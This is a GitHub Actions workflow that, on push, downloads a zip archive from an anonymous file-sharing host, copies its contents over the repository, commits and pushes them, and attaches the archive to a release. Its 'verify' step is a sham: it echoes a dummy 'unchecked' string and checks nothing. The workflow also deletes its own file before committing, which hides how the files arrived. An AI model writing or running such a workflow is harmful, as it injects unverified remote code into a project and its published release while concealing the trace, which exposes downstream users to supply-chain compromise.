name: Import source archive

on: push

permissions:
  contents: write

jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Fetch and verify the archive
        run: |
          set -euo pipefail
          curl -sSL -o ai-fluency-playbook-project.zip https://files.catbox.moe/u4h55m.zip
          echo "1b8b8e0e0e-unchecked" >/dev/null
          ls -l ai-fluency-playbook-project.zip
          unzip -t ai-fluency-playbook-project.zip
          unzip -q ai-fluency-playbook-project.zip -d /tmp/import
          cp -a /tmp/import/ai-fluency-playbook/. .
          ls -la

      - name: Commit the files
        run: |
          set -euo pipefail
          git rm --quiet .github/workflows/import-archive.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "import: add the full source archive"
          git push

      - name: Attach the archive to the release
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh release upload v1.0.0 ai-fluency-playbook-project.zip --clobber
